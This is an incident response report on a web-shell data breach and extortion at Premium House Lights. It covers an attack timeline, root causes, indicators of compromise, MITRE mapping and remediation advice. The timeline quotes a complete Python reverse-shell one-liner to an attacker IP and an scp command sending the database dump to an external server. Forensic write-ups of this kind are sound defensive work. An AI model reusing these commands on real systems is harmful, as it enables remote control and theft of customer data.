# 

# 

# 

# 

# 

# Premium House Lights: The Heist

## Violet Figueroa

[Executive Summary	3](#executive-summary)

[Incident Details	4](#incident-details)

[Company Network Overview	4](#company-network-overview)

[Comprehensive Attack Timeline for Premium House Lights	5](#comprehensive-attack-timeline-for-premium-house-lights)

[February 19, 2022	5](#february-19,-2022)

[Post-Compromise	5](#post-compromise)

[Technical Analysis and Attack Path	7](#technical-analysis-and-attack-path)

[Network Architecture Overview	7](#network-architecture-overview)

[Attack Path and Sequence of Events	8](#attack-path-and-sequence-of-events)

[Root Cause Analysis	10](#root-cause-analysis)

[Unrestricted File Upload Vulnerability	10](#unrestricted-file-upload-vulnerability)

[Inadequate Network Segmentation	10](#inadequate-network-segmentation)

[Excessive Privilege Assignment	10](#excessive-privilege-assignment)

[Inadequate Security Monitoring	11](#inadequate-security-monitoring)

[Systemic Issues	11](#systemic-issues)

[Impact Assessment	12](#impact-assessment)

[Data Breach Scope	12](#data-breach-scope)

[Business Impact	12](#business-impact)

[Regulatory Considerations	12](#regulatory-considerations)

[Response Actions Taken	12](#response-actions-taken)

[Recommendations	13](#recommendations)

[Immediate (0-7 days)	13](#immediate-\(0-7-days\))

[Short-term (8-30 days)	13](#short-term-\(8-30-days\))

[Evidence Preservation Plan	13](#evidence-preservation-plan)

[Lessons Learned	14](#lessons-learned)

[Conclusion	14](#conclusion)

[Citations	15](#citations)

[Appendices (Included in Google Drive)	16](#appendices-\(included-in-google-drive\))

# 

# Executive Summary {#executive-summary}

On the morning of February 19, 2022, Premium House Lights received an extortion email from a threat actor identifying themselves as "The 4C484C Group," claiming possession of the company’s customer database and demanding a ransom of 10 BTC, at the time worth approximately $370,752.80 USD (StatMuse, 2022\), to prevent public disclosure of sensitive customer information. The email included a sample of customer data as proof of access, raising immediate concerns about a potential data breach.  
A comprehensive forensic investigation was launched, leveraging key digital artifacts including network diagrams, web and database server logs, Wireshark packet captures, and a copy of the customer database (Appendix 5, 6). Analysis confirmed that an external attacker exploited a vulnerability in the public-facing web server (10.10.1.2), which is directly accessible from the internet as shown in the company’s network diagram (Appendix 1). The attacker uploaded a malicious web shell, obtained remote command execution, and moved laterally to the internal database server (10.10.1.3) due to insufficient network segmentation between critical assets (Appendix 1). With elevated privileges, the attacker exfiltrated the entire customer database, containing 244 records with personally identifiable and financial information.  
The breach exposed Premium House Lights to significant regulatory, financial, and reputational risks, including mandatory breach notifications and potential fines under international data protection laws. The incident was enabled by a combination of web application vulnerabilities, flat network architecture, and excessive privileges on production systems.  
Immediate priorities for the company include isolating and rebuilding compromised systems, segmenting the network to restrict lateral movement, enforcing least privilege on sensitive systems, and notifying affected customers and regulators as required. Long-term, Premium House Lights must invest in secure network design, continuous monitoring, and regular security assessments to mitigate future risks.

# 

# Incident Details {#incident-details}

* Case Name: Project Spotlight: Premium House Lights Data Breach  
* Incident Number: PHL-IR-2022-01  
* Date of Incident: February 19 and 20, 2022  
* Date Detected/Reported: February 22, 2022 (date extortion email received)  
* Attack target: Premium House Lights  
* Industry: High-end lighting ecommerce and retailer.  
* Reported By: Customer Support (upon receipt of extortion email)  
* Incident Handler/Investigator: Violet Figuera, Incident Response Analyst  
* See Appendix for details on Artifacts used for the investigation

## Company Network Overview {#company-network-overview}

The company’s network architecture consists of two main VLANs:

* Production VLAN (10.10.1.0/24): Hosts the webserver (10.10.1.2), database server (10.10.1.3), and file server.  
* Employees VLAN (10.10.5.0/24): Contains employee workstations and WiFi access.

A single firewall separates both VLANs from the internet, but there is no internal segmentation between the webserver and the database server. The webserver is directly accessible from the internet and hosts the company’s website (Appendix 1).

# 

# Comprehensive Attack Timeline for Premium House Lights {#comprehensive-attack-timeline-for-premium-house-lights}

## February 19, 2022 {#february-19,-2022}

Initial Reconnaissance Phase (21:56 \- 21:58)

* 21:56:11: SiteCheckerBotCrawler (from IPs 136.243.111.17 and 138.201.202.232) begins scanning the website  
* 21:58:22: Attacker (IP 138.68.92.163) initiates aggressive directory scanning using outdated user agent "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"

Vulnerability Identification (21:58:32 \- 21:59:00)

* 21:58:32: Attacker discovers /uploads directory (receives 301 redirect)  
* 21:58:40: Attacker confirms access to directory listing via /uploads/ (HTTP 200 OK)  
* 21:58:40: Attacker discovers upload functionality via /upload.php (HTTP 200 OK)  
* 21:58:55: Attacker makes secondary confirmation of upload directory access

Initial Compromise (21:59:04 \- 22:00:00)

* 21:59:04: Attacker uploads web shell via POST to /uploads/shell.php  
* \~21:59:10: Attacker downloads additional tools as seen in frame 354  
* \~21:59:30: Attacker executes Python reverse shell command through the web shell: python \-c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("138.68.92.163",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'  
* 

System Enumeration & Lateral Movement (22:00:00 \- 22:01:00)

* 22:00:27: Attacker runs netstat \-atunp to identify network connections  
* 22:00:48: Attacker checks sudo permissions with sudo \-l  
* 22:00:55: Attacker accesses MySQL with sudo mysql \-u root \-p

Data Access & Exfiltration (22:01:00 \- 22:03:00)

* 22:01:21: Attacker confirms access to customer data with SELECT \* FROM customers  
* 22:01:45: Attacker creates database dump: sudo mysqldump \-u root \-p phl \> phl.db  
* 22:02:26: Attacker exfiltrates database to external server: scp phl.db fierce@178.62.228.28:/tmp/phl.db  
* 22:02:36: Attacker deletes local database dump file: rm phl.db

## Post-Compromise {#post-compromise}

* Unknown date: Attackers analyze stolen data containing 244 customer records with PII  
* Several days later: Extortion email sent to support@premiumhouselights.com demanding 10 BTC

Key Security Findings

* The attack progressed from initial reconnaissance to successful data exfiltration in approximately 6 minutes  
* The attackers leveraged an unrestricted file upload vulnerability to establish initial access  
* Poor network segmentation allowed easy lateral movement between web and database servers  
* Excessive privileges (sudo access to MySQL) facilitated complete database access  
* No evidence of persistent access mechanisms was found  
* The attack methodology indicates a sophisticated external threat actor following standard attack patterns rather than an insider threat

# 

# Technical Analysis and Attack Path {#technical-analysis-and-attack-path}

![][image1]  
Appendix 1: Network Diagram

## Network Architecture Overview {#network-architecture-overview}

Premium House Lights’ network consists of two primary VLANs:

* Production VLAN (10.10.1.0/24): Contains the webserver (10.10.1.2), database server (10.10.1.3), and file server.  
* Employees VLAN (10.10.5.0/24): Contains employee workstations and WiFi access.

A single firewall separates both VLANs from the internet, but there is no internal segmentation between the webserver and the database server. The webserver is directly accessible from the internet and hosts the company’s website (Appendix 1).

## Attack Path and Sequence of Events {#attack-path-and-sequence-of-events}

Initial Reconnaissance:

* The attacker performed automated scanning of the public webserver (10.10.1.2) to identify potential vulnerabilities (Appendix 4).

Web Application Exploitation:

* Using a discovered file upload vulnerability, the attacker uploaded a malicious PHP web shell to the webserver (Appendix 4, 2).  
* The web shell provided remote command execution capability, confirmed by log entries and network traffic (Appendix 4, 2).

Privilege Escalation and Lateral Movement:

* The attacker used the web shell to execute a Python-based reverse shell, establishing an interactive session from the webserver to their own system (Appendix 2).  
* With this access, the attacker enumerated the network and discovered the database server (10.10.1.3), which was reachable due to the flat network architecture (Appendix 1, 2).

Database Compromise and Exfiltration:

* The attacker escalated privileges and accessed the database server using credentials or sudo access available to the webserver account (Appendix 5, 6).  
* They performed a database dump of all customer records (Appendix 5, 7).  
* The database file was exfiltrated to an external server using SCP over SSH, as confirmed by network captures (Appendix 3).

Key Technical Weaknesses:

* Unrestricted File Upload: The webserver allowed arbitrary file uploads, enabling the attacker to upload a malicious PHP web shell (Appendix 4).  
* Flat Network Architecture: Lack of segmentation allowed the attacker to move directly from the compromised webserver to the database server (Appendix 1).  
* Excessive Privileges: The webserver account had unnecessary sudo/database root privileges, facilitating database access (Appendix 5, 6).  
* Lack of Monitoring: There was no evidence of intrusion detection, real-time alerting, or log review to detect or respond to the attack in progress.

Indicators of Compromise (IOCs):

* Attacker IPs: 138.68.92.163 (reconnaissance, webshell, reverse shell), 178.62.228.28 (database exfiltration)  
* Malicious Files: shell.php (PHP web shell), database dump file (phl.db)  
* Suspicious Commands: Python reverse shell, SCP exfiltration commands (Appendix 5\)

MITRE ATT\&CK Mapping:  
The attacker’s actions during the Premium House Lights incident align with several tactics and techniques from the MITRE ATT\&CK framework (MITRE, 2024):

* Initial Access:  
  Exploit Public-Facing Application (MITRE T1190, 2024\) \- The attacker exploited a file upload vulnerability on the public webserver to gain initial access.  
* Execution:  
  Command and Scripting Interpreter: Web Shell (MITRE T1059.005, 2024\) \- The attacker uploaded and executed a PHP web shell to establish remote command execution.  
* Privilege Escalation:  
  Abuse Elevation Control Mechanism: Sudo (MITRE T1548.003, 2024\) \- The attacker leveraged sudo privileges to escalate access on the database server.  
* Lateral Movement:  
  Remote Services (MITRE T1021, 2024\) \- The attacker moved from the compromised webserver to the database server within the flat VLAN.  
* Collection:  
  Data from Local System (MITRE T1005, 2024\) \- The attacker performed a database dump to collect customer records.  
* Exfiltration:  
  Exfiltration Over Alternative Protocol: SCP/SSH (MITRE T1048.003, 2024\) \- The attacker exfiltrated the database dump to an external server using SCP over SSH.

This technical analysis demonstrates that the attacker exploited a combination of web application and network architecture weaknesses to compromise and exfiltrate sensitive customer data. The attached network diagram (Appendix 1\) visually supports this analysis, showing the lack of internal segmentation that enabled lateral movement between critical systems.

# Root Cause Analysis {#root-cause-analysis}

The Premium House Lights security breach resulted from a combination of interconnected security weaknesses, as evidenced by the forensic artifacts provided. This analysis identifies the primary vulnerabilities that enabled the attack and explains how they collectively contributed to a successful data breach.  
Primary Vulnerabilities

## Unrestricted File Upload Vulnerability {#unrestricted-file-upload-vulnerability}

The attacker's initial entry point was an unrestricted file upload vulnerability on the public-facing web server (10.10.1.2). Analysis of web access logs confirmed that the attacker was able to upload a malicious PHP web shell through the upload.php functionality. This vulnerability represents a critical web application security failure that provided the attacker with remote code execution capabilities.  
Contributing factors:

* No validation of uploaded file types or content  
* Executable permissions for uploaded PHP files  
* Direct access to the uploads directory from the internet  
* No web application firewall to detect or block malicious uploads

## Inadequate Network Segmentation {#inadequate-network-segmentation}

The Premium House Lights network diagram reveals a fundamental architectural weakness: both the public-facing webserver (10.10.1.2) and the sensitive database server (10.10.1.3) exist within the same Production VLAN (10.10.1.0/24) with no internal segmentation. This flat network design allowed the attacker to move laterally from the compromised webserver directly to the database containing customer information.  
Contributing factors:

* Absence of internal firewalls between critical systems  
* No network-based access controls between servers with different sensitivity levels  
* Single perimeter firewall providing the only defensive barrier  
* Critical systems (web and database) sharing the same broadcast domain

## Excessive Privilege Assignment {#excessive-privilege-assignment}

The database session logs revealed that the compromised account had elevated privileges that enabled direct access to sensitive customer data. The attacker successfully executed commands including "sudo mysql \-u root \-p" and "sudo mysqldump," indicating unnecessary administrative access rights granted to the compromised user account.  
Contributing factors:

* Violation of the principle of least privilege  
* Sudo access unnecessarily granted to service accounts  
* Direct database root access from the webserver  
* No multi-factor authentication for privileged actions

## Inadequate Security Monitoring {#inadequate-security-monitoring}

The timeline reconstructed from the available logs indicates that the attack progressed from initial scanning to data exfiltration without triggering any alerts or response. This highlights a critical lack of monitoring and detection capabilities.  
Contributing factors:

* Absence of intrusion detection/prevention systems  
* No evidence of log monitoring or alerting mechanisms  
* Large-scale data exfiltration went undetected  
* No suspicious activity monitoring on critical systems

## Systemic Issues {#systemic-issues}

Beyond the technical vulnerabilities, this incident reveals systemic security program deficiencies:

* Security Architecture Gaps: The network was designed for functionality without adequate security considerations  
* Security Governance Weaknesses: Lack of policies enforcing secure configurations and access controls  
* Insufficient Security Testing: No evidence of regular vulnerability scanning or penetration testing that would have identified these issues  
* Incident Response Limitations: Delayed detection and absence of a predefined response plan

The Premium House Lights breach resulted not from a single vulnerability but from multiple security control failures across technology, process, and governance domains. Addressing these fundamental issues is essential for preventing similar incidents in the future.

# Impact Assessment {#impact-assessment}

## Data Breach Scope {#data-breach-scope}

* Records Compromised: All 244 customer records in the database  
* Data Types Affected:  
  * Customer personal information (names, contact details)  
  * Complete address information (including international addresses)  
  * Phone numbers with international codes  
  * Financial data (customer spending amounts ranging from $0 to over $200,000)

## Business Impact {#business-impact}

* Customer Trust: Significant risk to reputation as a high-end lighting retailer  
* Financial Impact: Potential costs include:  
  * Breach notification to customers across multiple countries  
  * Forensic investigation and remediation  
  * Possible regulatory fines (especially for European customers under GDPR)  
* Operational Impact: Necessary downtime for server rebuilds and security improvements  
* Extortion Threat: Demand for 10 BTC, worth $370,752.80 USD (StatMuse, 2022\) as ransom

## Regulatory Considerations {#regulatory-considerations}

* Multi-jurisdictional Exposure: Customer data spans multiple countries and regions  
* GDPR Compliance: European customer data was compromised, triggering potential notification requirements  
* PCI DSS Concerns: Financial data exposure may violate payment card industry standards  
* Data Breach Notification Laws: Various US state laws and international regulations apply

This impact assessment highlights the serious consequences of the breach for Premium House Lights, emphasizing the need for immediate and comprehensive remediation efforts.

# Response Actions Taken {#response-actions-taken}

* All relevant logs, network captures, and database files were collected and preserved with SHA256 hashes to ensure integrity (Appendix 8\)  
* Forensic analysis was initiated immediately upon receipt of the extortion email  
* The compromised webserver was isolated from the network to prevent further unauthorized access  
* Credentials for all privileged accounts were reset to prevent continued access  
* Notifications to legal counsel and regulatory bodies were prepared in accordance with applicable laws  
* Customer notification plans were developed to comply with breach notification requirements

These actions were critical in containing the breach and beginning the remediation process.

# Recommendations {#recommendations}

## Immediate (0-7 days) {#immediate-(0-7-days)}

* Implement Network Security Zones:  
  * Deploy internal firewalls between web and database servers  
  * Create true DMZ for internet-facing systems  
  * Restrict traffic between zones based on least privilege  
* System Hardening:  
  * Rebuild compromised web server from trusted media  
  * Remove vulnerable upload functionality  
  * Implement proper input validation on all web forms  
* Access Control Remediation:  
  * Remove sudo access from web application accounts  
  * Implement proper database access controls  
  * Enforce principle of least privilege across all systems

## Short-term (8-30 days) {#short-term-(8-30-days)}

* Monitoring Improvements:  
  * Deploy IDS/IPS at network boundaries  
  * Implement SIEM solution for log correlation  
  * Set up alerts for suspicious database activity  
* Network Architecture Redesign:  
  * Create three-tier architecture (web, application, data)  
  * Deploy web application firewall (WAF)  
  * Implement proper egress filtering

# Evidence Preservation Plan {#evidence-preservation-plan}

All evidence has been preserved according to forensic best practices:

* Digital artifacts maintained with SHA256 hashes  
* Chain of custody documentation completed  
* Evidence stored securely for potential legal proceedings  
* All systems imaged before remediation

# Lessons Learned {#lessons-learned}

* Web application vulnerabilities, especially unrestricted file uploads, remain a critical attack vector (Appendix 4\)  
* Flat network architectures without internal segmentation enable rapid lateral movement and increase breach impact (Appendix 1\)  
* Excessive privileges on production systems can turn a single compromise into a full-scale data breach (Appendix 5\)  
* Lack of real-time monitoring and alerting delayed detection and response  
* Incident response planning and regular security assessments are essential for preparedness and resilience

These lessons highlight the importance of a defense-in-depth approach to cybersecurity.

# Conclusion {#conclusion}

The Premium House Lights data breach was the result of a combination of web application vulnerabilities, insufficient network segmentation, and excessive privileges. The attacker exploited an unrestricted file upload vulnerability to gain initial access, then moved laterally within a flat network to access and exfiltrate the customer database.  
The breach exposed sensitive customer information and resulted in a ransom demand of 10 BTC, worth $370,752.80 USD (StatMuse, 2022). Immediate and long-term remediation efforts are necessary to prevent recurrence, including network segmentation, privilege management, and enhanced monitoring.  
By implementing the recommendations outlined in this report, Premium House Lights can significantly improve its security posture and reduce the risk of future incidents.

# Citations {#citations}

1. MITRE. (2024). MITRE ATT\&CK® Matrix for Enterprise. [https://attack.mitre.org/matrices/enterprise/](https://attack.mitre.org/matrices/enterprise/)  
2. StatMuse. (2022). *Bitcoin price February 21, 2022*. [https://www.statmuse.com/money/ask/bitcoin-price-february-2022](https://www.statmuse.com/money/ask/bitcoin-price-february-2022)  
3. 

# Appendices (Included in Google Drive) {#appendices-(included-in-google-drive)}

| Appendix | Artifact Name | File Name | SHA256 Hash |
| :---- | :---- | :---- | :---- |
| 1 | Network Diagram | phl\_network\_diagram.png | e9eaf64b7f1d69d255c7245f44deb7aca4358d2c0399eebd77fe4482bc2eb468 |
| 2 | Webserver Network Capture | phl\_webserver.pcap | 6b40cb60e4c25e7143a67bbaa3e532417d27b7cdd6034b03ee07e244c2bdd8ef |
| 3 | Database Server Network Capture | phl\_database.pcap | ec309fed496b60ddcb3ca9483409efd90c8b31ddfe94000238ca5f64ef199db1 |
| 4 | Web Application Access Log | phl\_access\_log.txt | a66f7146673945cb7ddf2b6729ed52925f4b360b49443bb27396c01fa2536d4f |
| 5 | Database Session Log | phl\_database\_shell.txt | 8f52f9ddafa8375bb140e5b4ec540a178b8c6ba200980d91671c8a7fcb34da2c |
| 6 | Database Access Log | phl\_database\_access\_log.txt | 22f19001f353b562858eab2e7c889c86e5c9c1018145e52794315bf9c73f0d65 |
| 7 | Customer Database | phl\_database\_tables.db | 29a5a3057fde1fbc7676983acdd5979180f4805472596d21f15f7868025f2ee8 |
| 8 | Artifact Hashes | sha256sum.txt | (hash not needed; file is summary of above) |

# 

[image1]: <data:image/png;base64,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